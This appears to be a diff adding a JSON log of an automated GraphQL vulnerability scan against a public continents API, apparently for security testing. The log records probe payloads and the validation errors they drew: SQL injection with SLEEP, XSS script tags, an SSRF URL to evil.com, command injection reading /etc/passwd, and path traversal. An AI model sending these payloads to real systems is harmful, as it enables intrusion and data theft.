@@ -1,0 +1,311 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  continents {\n    code\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.186,
+    "timestamp": "2025-09-29T10:02:25.188460Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "continents": [
+          {
+            "code": "AF",
+            "name": "Africa"
+          },
+          {
+            "code": "AN",
+            "name": "Antarctica"
+          },
+          {
+            "code": "AS",
+            "name": "Asia"
+          },
+          {
+            "code": "EU",
+            "name": "Europe"
+          },
+          {
+            "code": "NA",
+            "name": "North America"
+          },
+          {
+            "code": "OC",
+            "name": "Oceania"
+          },
+          {
+            "code": "SA",
+            "name": "South America"
+          }
+        ]
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  continents(filter: { code: \"'; SELECT SLEEP(5); -- \" }) {\n    code\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.225,
+    "timestamp": "2025-09-29T10:02:27.781518Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Expected value of type \"StringQueryOperatorInput\", found \"'; SELECT SLEEP(5); -- \".",
+          "locations": [
+            {
+              "line": 2,
+              "column": 29
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  continents(filter: { name: \"<script>alert('XSS');</script>\" }) {\n    code\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.171,
+    "timestamp": "2025-09-29T10:02:29.705333Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"name\" is not defined by type \"ContinentFilterInput\".",
+          "locations": [
+            {
+              "line": 2,
+              "column": 23
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  continents(filter: { code: \"http://evil.com/ssrf?param=\" }) {\n    code\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.146,
+    "timestamp": "2025-09-29T10:02:32.427602Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Expected value of type \"StringQueryOperatorInput\", found \"http://evil.com/ssrf?param=\".",
+          "locations": [
+            {
+              "line": 2,
+              "column": 29
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  continents(filter: { name: \"$(cat /etc/passwd)\" }) {\n    code\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.184,
+    "timestamp": "2025-09-29T10:02:35.021829Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"name\" is not defined by type \"ContinentFilterInput\".",
+          "locations": [
+            {
+              "line": 2,
+              "column": 23
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  continents(filter: { code: \"../../../etc/passwd\" }) {\n    code\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.16,
+    "timestamp": "2025-09-29T10:02:37.497480Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Expected value of type \"StringQueryOperatorInput\", found \"../../../etc/passwd\".",
+          "locations": [
+            {
+              "line": 2,
+              "column": 29
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  continents(filter: { name: \"<img src=x onerror=alert('HTML_Injection')>\" }) {\n    code\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.482,
+    "timestamp": "2025-09-29T10:02:40.007863Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"name\" is not defined by type \"ContinentFilterInput\".",
+          "locations": [
+            {
+              "line": 2,
+              "column": 23
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery continentsAlias {\n  myContinents: continents {\n    code\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  continents {\n    types {\n      name\n      kind\n      description\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.209,
+    "timestamp": "2025-09-29T10:02:42.681646Z",
+    "count": 9,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Continent\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  continents {\n    cod\n    nam\n    countri\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.174,
+    "timestamp": "2025-09-29T10:02:45.245602Z",
+    "count": 10,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"cod\" on type \"Continent\". Did you mean \"code\"?",
+          "locations": [
+            {
+              "line": 3,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"nam\" on type \"Continent\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"countri\" on type \"Continent\". Did you mean \"countries\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
